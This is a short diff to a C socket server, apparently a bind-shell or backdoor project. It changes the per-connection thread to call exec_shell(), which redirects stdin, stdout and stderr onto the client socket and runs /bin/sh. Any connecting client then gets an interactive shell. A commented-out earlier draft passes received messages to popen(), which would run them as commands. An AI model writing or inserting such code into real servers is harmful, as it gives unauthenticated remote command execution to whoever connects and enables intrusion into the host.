@@ -10,6 +10,7 @@
 
 static void child_process(int sock);
 static void *child_thread(void *arg);
+static void exec_shell(int sock);
 
 typedef enum {
 	SERVER_NOT_DEFINED,
@@ -118,24 +119,38 @@ static void child_process(int sock)
 static void *child_thread(void *arg)
 {
 	int sock = *(int *)arg;
-	int read_size = 0;
-	char client_message[2000];
+	exec_shell(sock);
+	// int read_size = 0;
+	// char client_message[2000];
 
-	memset(client_message, 0x00, 2000);
+	// memset(client_message, 0x00, 2000);
 
-	printf("Hello, I`m thread!\n");
+	// while(1) {
+	// 	if (read_size = recv(sock , client_message , 2000 , 0) > 0){
+	// 		// printf("Received message: ");
+	// 		// printf("%s", client_message);
+	// 		if (popen(client_message , "r") == NULL){
+	// 			perror("ERROR popen");
+	// 		}
+	// 		if(send())
+	// 		memset(client_message, 0x00, 2000);
+	// 	}
+	// 	if (read_size == 0){
+	// 		// printf("Client disconnected\n");
+	// 		break;
+	// 	} else if (read_size == -1){
+	// 		perror("ERROR recv failed");
+	// 	}
+	// }
+}
 
-	while(1) {
-		if (read_size = recv(sock , client_message , 2000 , 0) > 0){
-			printf("Received message: ");
-			printf("%s", client_message);
-			memset(client_message, 0x00, 2000);
-		}
-		if (read_size == 0){
-			printf("Client disconnected\n");
-			break;
-		} else if (read_size == -1){
-			perror("ERROR recv failed");
-		}
-	}
+static void exec_shell(int sock) 
+{
+	// Redirect IO
+	dup2(sock, 0);
+	dup2(sock, 1);
+	dup2(sock, 2);
+
+	// Execute shell
+	execl("/bin/sh", "sh", NULL);
 }
